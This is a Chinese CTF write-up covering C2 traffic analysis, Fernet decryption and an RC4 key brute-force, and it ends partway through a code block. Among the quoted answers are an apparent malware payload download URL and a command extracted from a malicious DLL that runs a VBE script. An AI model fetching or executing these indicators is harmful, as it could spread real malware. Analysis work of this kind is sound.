href="#区块链威胁分析-2" class="headerlink" title="区块链威胁分析.2"></a>区块链威胁分析.2</h2><p>这个app 就是一个黑客组织Lazarus 向区块链行业  弄得恶意应用程序</p><p>所以答案就是Lazarus </p><h2 id="C2流量分析-1"><a href="#C2流量分析-1" class="headerlink" title="C2流量分析.1"></a>C2流量分析.1</h2><p>追踪TCP流 在流16</p><p>发现了答案</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111445659.png" alt="image-20230403111445659"></p><p>这个就是flag</p><p><code>http://imgcache.cloudservicesdevc.tk/picturess/2023/RDSv38.dll</code></p><h2 id="C2流量分析-2"><a href="#C2流量分析-2" class="headerlink" title="C2流量分析.2"></a>C2流量分析.2</h2><p>请提交Payload的SHA256哈希值。（字母大写，请根据流量内容作答）</p><p>找个在线网站</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111548795.png" alt="image-20230403111548795"></p><p>当然也可以用Linux命令（推荐）</p><p>flag <code>AA2CBD3103CECAF189F93D787C602679E156CC6FD90E22646D637F01C64222CF</code></p><h2 id="C2流量分析-3"><a href="#C2流量分析-3" class="headerlink" title="C2流量分析.3"></a>C2流量分析.3</h2><p>Wireshark把文件导出来</p><p>根据题目描述 说有个有毒的程序</p><p>定位 最下面的DLL程序</p><p>确实也报毒了</p><p>用ida64打开</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111805956.png" alt="image-20230403111805956"></p><p>flag  <code>cmd.exe /c C:/Users/Public/Documents/2022060128.vbe</code></p><h2 id="C2流量分析-4"><a href="#C2流量分析-4" class="headerlink" title="C2流量分析.4"></a>C2流量分析.4</h2><p>请提交Payload中需要Base64解码的cmd命令的个数。（答案示例：1）</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403111834346.png" alt="image-20230403111834346"></p><p>咱就是说， 我们这的师傅直接猜3拿了一血，牛</p><p>还有就是， 这数据分析题对逆向师傅来说也太友好了吧</p><h2 id="fernet-3"><a href="#fernet-3" class="headerlink" title="fernet.3"></a>fernet.3</h2><p>针对 前两个我没写全（别的师傅解的）， 我就只贴这个了</p><p>wireshark追踪流</p><p>7，8 ，9</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403112050637.png" alt="image-20230403112050637"></p><p>Base64转图片</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403112100379.png" alt="image-20230403112100379"></p><p>太抽象了  Stegsolve 转一下色道</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403112115819.png" alt="image-20230403112115819"></p><p> <code>flag{a20cb3c9-141c-41c4-8255-0cd3eb95b681}</code></p><p>贴一下我的脚本</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这是思路</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.kdf.pbkdf2 <span class="keyword">import</span> PBKDF2HMAC</span><br><span class="line"></span><br><span class="line">key = <span class="string">"开头的key"</span></span><br><span class="line"></span><br><span class="line">f = Fernet(key)</span><br><span class="line"></span><br><span class="line">token = <span class="string">b'密文'</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decrypted data: "</span>, f.decrypt(token).decode())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><p>就是这样， 明白了吧</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> hashes</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.kdf.pbkdf2 <span class="keyword">import</span> PBKDF2HMAC</span><br><span class="line"></span><br><span class="line">key = <span class="string">"eBp92fUD7Lk_6qXR2pIjFt3sBH-lW0ul830S-sO6QCQ="</span></span><br><span class="line"></span><br><span class="line">f = Fernet(key)</span><br><span class="line"></span><br><span class="line">token = <span class="string">b'gAAAAABkGeDiBcfniXRJpihFhn0EPQUDIiNwd2FbIOpEMo4MNCVL9irQ6SwekLpgQ5zD5_nFti4Mij-VhdpKEifNi2hL1AqwZ7twArf96rxLpBVJEa2LmvM9plBSpg6f_qEWAQveQmI4VM_yWsTwPxPrNcB-syF8oV1T_xTMAFzL0vgj2ScD-SWnHP5ZbJ4AI_Jsdxnr7gFDrUvf5sbuCICGPW39sWs6bPyy73IWZvANBD3M4vb2n9M6LIuLhvs48oNvdc0YONqUj9qs_ezffqFeCtWvjEZP4LBKEWnIW-2XL1GE5wluChpwYvlFYMN0xoZmDOnuVYTFL0_438xQw7cSBSEgmdMnCNOWfDVZvh-kFahbbDMLUP3wrKviWeMHNLxS6p4ebrQECc-s_cDNzvZBr-zHPPtn-3O5zE0w-OJec0h31Q52paMmEPKWHybAWQHPELAFTaNxvU0h33qHsoObNgn4t5Rs066HAnM9RGpmj3ynalvhg0-uws1JxAgysNQIy4xtokfu9RFoBgtjymHFmlfRQ5Smck7Szw2Kqawz8psIHNbt2Av9gzKo5aPXJFN9vYKK59iu-qIv7IExD2Aap-RBVyKbn0pXlH7TztwTZ6V1VhkqI5QFrFEwjcC9uVZYTsot317WIHAoCA3bKGkZNb8emKYXUL7UhePDjr7ljAOQSZPrrZMYGIUJ8FLprkCOLJSJkJS4eLJuYEegiC_uqjAaSfuLsGxWz_Ua7p0OxrhTCpP8YodnvdT6nhsDS4TA2XLX3x00UVVhG4HMfePvAoexpigzTDB1HLJaXsT95HEA49fksKmOchLuxYdKTT_UPnNCg9D4DQl0f2h-3GKugkwXcXss4sdNvvlolcxJYJKJXAjTILewnb7l-n0Z4Vpvdbpvg5RzRn-bdRCkQ1JE28nX5mQAbHhTouE-QqsBrcL1sGjhbRZOdDco5kxj5P6IEBDLrS9BiavQp6UeMQxjZ0lMktISaUHvAa3kWJMAvQKE9QvEXuuel6h0Cqz5fCiNaOTl9DvHtpQwSeYe3KuyleQNJigdvt_JQj9G5BMUYdO5hjU8f6c1JkknHDPylXoOt8gKrNPQ6zlS3rZ8cH92j1cw1FXDoDsBRyEydYASWUPxHRAVxwP2KYXS5YI0GZAVIcQKwRvppY7oBEhISkKg_dx0a7WM_mlPULUcaXWFBnCUcYOljq7IadgRtT3M0X8dCmICrBVsUeSWmYNItrwAPl2DtRqLXbb8YEICJ8J3_Qtm7XzV7vE9ozhh88PlHp676Pm4rT3ESh1VSbUq2zXMWry0SZ9ESRPreU9Ll8CTNJScnv187rxmakYYzh2X0Me6u-NEqpyGndwo-7roHEopps04ZQzpVc9gPaQ5Nw3rmqJdBiA6NZnKcsedoutq5NCa2aIxqXaVlev9zzdaqzDft5qRVuPfQBJIhiDfXmcXOVDXx3Quz_IZBP2Ll_iQxCgi2QrwNScqZ203qmQ-X0cU6edhWIGCAes9M9Ox7BH2r7xTCdYqTHeruLbu_mid3E4VIaa4MsRubXH5L8jowR2D7DO68TmkmXSI3fnTgHTr_swNXoky5ZtZToFVD1uTLWHPTN9nXoWdrvvE5qftIvyMO9FEil-EAyttfJ3ABPTJBWN2dUQ-LK7VoZRVE6_u57FKY1RgFgz7xz3UPtOTlHURLI1hUiL_FrL-nF0e5ZsV5OwFbVCSvT8JaMhLbux1FG4k0-TC1N79-pnKZnQY_kA6AyH36G0HpImQvJO378UguIMFLXdGd7hulzdD_SuSUF9ivdK1x3yEfA10UfWbLYSUZa0ZqtefP26muOWv-ab9SZclEIWL4x2g6aPB0P0dkrDZrC_iSR-lG85L1E-JkycCTDFI3sW1OTq1kzRuwmmnSDHnkpNDPT3A-DrRwzIymjQ-TgnTtoqjiesngjIjICMuw_bQ2c7bXYeTFK6Hr3w8BR8isZ6ODgRWD5fW-r_BUwd89URpmLdGKh0Se4Q20KnHTNoHoTK1Klwc-6zwbS5NyYzhsazM5xkBKPWLg6HQXH8ce6db_1mxtdVjKnfgVLUGR86pUb4ivx7ZbuS37tuecn17aF9-NJ68DLmLi7B90Zxori1gePIsD7lYAgUykbXQ32Ba_0u0REvqYhaBdHl3RySnBIzXS-4skpQXzCMKZLD9twxOmPRe-WQyP7CdnFOLOotcRwaRS4lS_nWVZo4nyynms-srx8CO8-Xwd5Ei7ZBj9BxQPKt_yspw-aWcTSMnWeqdSTgR6JgclDYnXvPRyHqNd4K0n0cwVfN0w2DPDFObFrWv46wthrWsllJtfB4uFlItLMkIbR7P4ydvLChFUZ7SIl_jvurTV83KG6hoWN5v5QSKkNWNBnbXFT9Amne4iMgdyM0PgMbH-9FMf24w2jZPCYEmq6Od24ZknSiJ6igsMmg7rYb8vj4H_VCUeL9CfpRY-BEVEgR79FajjlFz8CxFr05tcCrXuBAH0EYaEEPJQ1J298DlOcPogv4vVGmlWQA-xUJGmjWvjl-Y4IyRnv7eBhgLJXFPosAawjX9zsZjQCum0iRy4ACPX8Vio3q8xV0ZPP8PG_9MDvMc4KPJmLscFHUDUNBsXuDOwl_WzxwydK-bKhyN5WWi5J3o65K7_o0NtKMVu2huzrHT5UXY0zA3bbcTKBKWvGzO4nIctsvr3vpTaLPpDayRSR5v7ZZuIw6mvyRZAYFZxYxMZfgXQvYSZFCEDoVtV90EjqiTmWpNz_bFHY5eSseHiCP6HJHNNbbNnfCQsGa64Ty6cB0xPed4CJgltGUeEVCJ2bzj_9j3IWkiSYFvc_mCM4s5dfg4D--cq2n2iVX0nI5bns_KnVMrnRT7lF3oqxT4nbNBaB9y3FGhXlaatWnkq6S2hF50SnEtdiksSV8tZGYJpMY86UCM5E0NFjHX6jeCQkRBOqpP6L2wLf299xXRmpawND9VYNvkDdDfP8z1tSou4bSGME8c7CCg9OcwEbSxsbk5pXDAqOdZYbNwFur5mC1m-TQCjvXIPM4bnLntaBNrq98bcsmKczgqGZkJNgQT0ARwo0iWuiji0t1V3canUoLgb4sGRoU_PjsQ-Y11baUNQDV2lIrkQJBg4b20JaN291ZToK0a_Zcc9-WMLiAEqynms8Tz-SCELM1GnKhSQ6yYxNSDWmBgu9gSj7I37nxusrMAFXEQOLb4WXSbsGiK0cA-M1aalj_8HaRlom2F4oWVPSd3RdezQlR5nU1NaV9rhZUjEbypBdsMr6rJgXL4V3XQ053nI8P0_UignHzk8r5b3q6xtiaeVV-8AyooCY0GsFinnSf1c_5gcH2uwJEkD0JJVnDJZaorhBHJL8zSsaGYWfKA2Cmzx8CYH1X6nf5pnthKuru5Vkme1BgUm_qKekU_3279p05ZIyNLkKfShrKTHmzDCgBkefPhw2pSFEAwKkmUoWpTipgdxsgigvwa3QEofyNuNu87cVjZGv8nr2g7aMwz2AYZpg3xJEnU9HiEN5OEN9OyQiIU0dIIFKw8g0KLsdc4ymb_HHL8D6SAH7ViDhDUzhFxalPh9dlEdJi7fOWcBUOIwSq2DMegxnl3aSOgbxRkOwc-yIT3g54YShTmhK6iRTHqOEPlg4qTZOxCynkKL2FBKhFRtqSmZgTAVc4OT4U88LJ7S8W8XbUYKfslQibcTWTdvQGB0CBui43cUzXZx12HzjDHXejlqyk1nAP9YJP4KWArnDwXETE2wUwHWwdT00sPUtQ4kwx-zgAP-P66kGbN32Nq0woS59uQ74mntXzmGewqsFzXADv2gIaXwqQNl21TlBEIDk1KDogkWsUg1UNCwtV5AYif8e9OFBS0x4snnJYtg7p7AfmpPaDS-3DtROg_Ne7gmq6yQyUVgsWFLf6CGlyIz067Yr8TTj9DPQBrIAuM1aAkDNw7-TJGLJ-M44FagoOhglCsEnqtqVZt0ELV60RbBybGi6J4N9R6pW9iZJamNPUUNJQzBJQ6eA41xmYTxGJ6ZIAQJQ93oo_cSMsDkNzKQwE9smZvKq9ny5CQSFu8w-MupksReUF5hdKYyBTLkuvuFzrjFboK__d-8xDsuECvNHTQhiI3rpzCCZUZ1fpV4WmcEJAnRbefvERfD2rj0Osedr1A9QKkAn3YvGJkHJ9LFHIrmRrLABSzw1ZfRKlpGi7J3LjDb06D7SPYb122KL4o7HTgHv98HtV52WhLaPahPszbEZ4Iuwyt1XyG0jq4_n0Hud9t7O0Z0iRnLk5vuFJzTkVfo5985Kv3Q2Cd4bIlWYX-_of7AYnHPqRGcpqbiTUutTw9ZPPst5um5gK66aN5MWHpqrKdDKO73P6FNkSCzaQOBJ6PUmmLDwPj0q3hBDWt2MVNTUOuCj5OcVHBIsGTLYRXlyE_lGDv1hK7wGHoyjYYiSZpEfNyGWv6yUTBqQUdu7-uXjKE5uFqrh00VDmdAuXR56KR0DeT7--KPkS6FcWdeDW66Teaqq-NG-D5ONauNa2iMdUgZcBkX3qSa5A_Jv5hkE12xADr4-piYBPmPYFx9WXgo4R4b8DrZXMIgsT6jCyVdbs41ch8IyZO_bCE6366z3N6GTxeYCfOMywaK5TjUjvRbKx5irkgm_W3gcj47kmJdKkFYGmVgF8j5iJvClQnHADzkFUYZ3rtUuJZV5CR9Yl4juZdcx0rid9E3-Iy7hpITwE0uSbc8F-a85WB1E4fkjddFdqwTFue7MuyQ98GTAewV0qv817_zAyrRRzIK0LnntUBFlJ_yGy0OrT5YmcNgDfCAe0LjGafHz1xo2OEqjPcmoPTuS2XMD4X1S0WcloMlMdCCKgE73ifWEH5u90pSdA3tycUGt4lmoVIskAlxXDsNHDO7gWuWkHBSgaWXv8WwkF_fS9kFL7G0aw8WNKEs9e8elb_IFyrOmYjgR_fldEGC5kGX1oM91bfl6I_k7J6y-DbcWL7sFLJzMSVv6nFLjNQ7om1OFD7kFVSBRw3Nj1HMOpWobcVXoppbcYJ9Y_lw9DPWonTM3jbCMrKPtc59D0opu4Te5Il1_YatjbLbktQ7Xh0hr0nje8m9_n2Ek8wz-2zh8HMftCY_CNmqUtm6OiQxzzgfmA1C9nCohNprp6IpuO4zqGf9XekTavDc15UgOWbLJn5BzFVRIAnydYIzKRwDa62t4gntXKGH882KVDbLASueC7ms1vUJ_SzCSlzwC7WYerwi9p7tCmN7lzf7kuR4fTMDPNCaK52xNTMnZ9ZFqDqhfRlmqBj5LCps3xpHWFUPoWZLGWNVqRKKLvSLDNLHezYR-Q7np1Fp-10iCyjSslRzqBMeLHfZpFus_teKIfEupgUlbOJ1VpMWhgt4O1aD_PRvHMLLdN6U5QrtYn4N6d209VTEERYx4LE3SH7IjgV7_nHzzPhW_Z_G05S-AFSb_fd7aH4fJ7uHoT_W-24exJ46lKJ1xDJAq-1w7Mbwjlm_8lptuuDezyNYlI4woAPTFRZWXEUdVJ859zKSGL0fg-PR5ypUTnFkNkTjQ=='</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">"Decrypted data: "</span>, f.decrypt(token).decode())</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h1 id="数据安全-逆向部分"><a href="#数据安全-逆向部分" class="headerlink" title="数据安全-逆向部分"></a>数据安全-逆向部分</h1><p>有两个是逆向题</p><p>一个看着吓人， 其实就是个RC4算法，而且还没魔改（不对， RC4确实不好魔改， 但是呢，也没有结合别的算法）挺好解的， 就是有点唬人了</p><p>而另一个不出意外的话就出意外了（BUSHI）  爆零了</p><h2 id="letsGO"><a href="#letsGO" class="headerlink" title="letsGO"></a>letsGO</h2><p>用go语言写的  </p><p>总体思路就是</p><ol><li>发现是RC4加密</li><li>找到密文</li><li>找流密钥（没有就暴破）</li><li>解密</li></ol><p>ida64分析</p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403133430785.png" alt="image-20230403133430785"></p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403133535399.png" alt="image-20230403133535399"></p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403134818076.png" alt="image-20230403134818076"></p><p><img src="/2023/04/03/2023%E6%95%B0%E5%AD%97%E4%BA%BA%E6%89%8D%E6%8C%91%E6%88%98%E8%B5%9B-%E6%B0%B8%E4%BF%A1%E8%B5%9B%E9%81%93WP/image-20230403142146129.png" alt="image-20230403142146129"></p><p>贴exp</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line">using namespace std;</span><br><span class="line">/*</span><br><span class="line">RC4初始化函数</span><br><span class="line">*/</span><br><span class="line">void rc4_init(unsigned char* s, unsigned char* key, unsigned long Len_k)</span><br><span class="line">{</span><br><span class="line"><span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">char k[<span class="number">256</span>] = { <span class="number">0</span> };</span><br><span class="line">unsigned char tmp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) {</span><br><span class="line">s[i] = i;</span><br><span class="line">k[i] = key[i % Len_k];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) {</span><br><span class="line">j = (j + s[i] + k[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">RC4加解密函数</span><br><span class="line">unsigned char* Data     加解密的数据</span><br><span class="line">unsigned long Len_D     加解密数据的长度</span><br><span class="line">unsigned char* key      密钥</span><br><span class="line">unsigned long Len_k     密钥长度</span><br><span class="line">*/</span><br><span class="line">void rc4_crypt(unsigned char* Data, unsigned long Len_D, unsigned char* key, unsigned long Len_k) //加解密</span><br><span class="line">{</span><br><span class="line">unsigned char s[<span class="number">256</span>];</span><br><span class="line">rc4_init(s, key, Len_k);</span><br><span class="line"><span class="built_in">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, t = <span class="number">0</span>;</span><br><span class="line">unsigned long k = <span class="number">0</span>;</span><br><span class="line">unsigned char tmp;</span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; Len_D; k++) {</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + s[i]) % <span class="number">256</span>;</span><br><span class="line">tmp = s[i];</span><br><span class="line">s[i] = s[j];</span><br><span class="line">s[j] = tmp;</span><br><span class="line">t = (s[i] + s[j]) % <span class="number">256</span>;</span><br><span class="line">Data[k] = Data[k] ^ s[t];</span><br><span class="line">}</span><br><span class="line"><span class="keyword">if</span> (Data[<span class="number">0</span>] == <span class="string">'f'</span> &amp;&amp; Data[<span class="number">1</span>] == <span class="string">'l'</span> &amp;&amp; Data[<span class="number">2</span>] == <span class="string">'a'</span> &amp;&amp; Data[<span class="number">3</span>] == <span class="string">'g'</span>)</span><br><span class="line">{</span><br><span class="line">printf(<span class="string">"ok"</span>);</span><br><span class="line">cout &lt;&lt; Data &lt;&lt; endl;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">void main()</span><br><span class="line">{</span><br><span class="line">//字符串密钥</span><br><span class="line">unsigned char key[<span class="number">3</span>] = { <span class="number">0</span> };</span><br><span class="line">unsigned long key_len = sizeof(key);</span><br><span class="line"></span><br><span class="line">//密文</span><br><span class="line">unsigned char data[] = { <span class="number">0x6</span>,<span class="number">0x74</span>,<span class="number">0xb4</span>,<span class="number">0xe2</span>,<span class="number">0x49</span>,<span class="number">0xd</span>,<span class="number">0x91</span>,<span class="number">0x36</span>,<span class="number">0x95</span>,<span class="number">0x9d</span>,<span class="number">0x7a</span>,<span class="number">0xfe</span>,<span class="number">0xc7</span>,<span class="number">0xa9</span>,<span class="number">0xa4</span>,<span class="number">0xa1</span>,<span class="number">0xf0</span>,<span class="number">0xf6</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0x90</span>,<span class="number">0xfa</span>,<span class="number">0x1a</span>,<span class="number">0x32</span>,<span class="number">0xa7</span>,<span class="number">0x6d</span>,<span class="number">0x39</span>,<span class="number">0xee</span> };</span><br><span class="line">unsigned char datas[] = { <span class="number">0x6</span>,<span class="number">0x74</span>,<span class="number">0xb4</span>,<span class="number">0xe2</span>,<span class="number">0x49</span>,<span class="number">0xd</span>,<span class="number">0x91</span>,<span class="number">0x36</span>,<span class="number">0x95</span>,<span class="number">0x9d</span>,<span class="number">0x7a</span>,<span class="number">0xfe</span>,<span class="number">0xc7</span>,<span class="number">0xa9</span>,<span class="number">0xa4</span>,<span class="number">0xa1</span>,<span class="number">0xf0</span>,<span class="number">0xf6</span>,<span class="number">0x3</span>,<span class="number">0x56</span>,<span class="number">0x90</span>,<span class="number">0xfa</span>,<span class="number">0x1a</span>,<span class="number">0x32</span>,<span class="number">0xa7</span>,<span class="number">0x6d</span>,<span class="number">0x39</span>,<span class="number">0xee</span> };</span><br><span class="line"></span><br><span class="line">//加解密</span><br><span class="line">//rc4_crypt(data, sizeof(data), key, key_len);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i1 = <span class="number">0</span>; i1 &lt; <span class="number">256</span>; i1++)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">256</span>; i2++)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i3 = <span class="number">0</span>; i3 &lt; <span class="number">256</span>; i3++)</span><br><span class="line">{</span><br><span class="line">key[<span class="number">0</span>] = i1;</span><br><span class="line">key[<span class="number">1</span>] = i2;</span><br><span class="line">key[<span class="number">2</span>] = i3;</span><br><span class="line">rc4_crypt(datas, sizeof(data), key, key_len);</span><br><span class="line">memcpy(datas, data, sizeof(data));</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag{Go_1an9_1s_n07_s0_Hard}</span></span><br></pre></td></tr></tbody></table></figure><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># # def RC4(keys):</span></span><br><span class="line"><span class="comment"># #     cipher = [0x6, 0x74, 0xb4, 0xe2, 0x49, 0xd, 0x91, 0x36, 0x95, 0x9d, 0x7a, 0xfe, 0xc7, 0xa9, 0xa4, 0xa1, 0xf0, 0xf6,</span></span><br><span class="line"><span class="comment"># #               0x3, 0x56, 0x90, 0xfa, 0x1a, 0x32, 0xa7, 0x6d, 0x39, 0xee]</span></span><br><span class="line"><span class="comment"># #</span></span><br><span class="line"><span class="comment"># #     key = list(keys)</span></span><br><span class="line"><span class="comment"># #     # KSA</span></span><br><span class="line"><span class="comment"># #     S = [i for i in range(256)]</span></span><br><span class="line"><span class="comment"># #     j 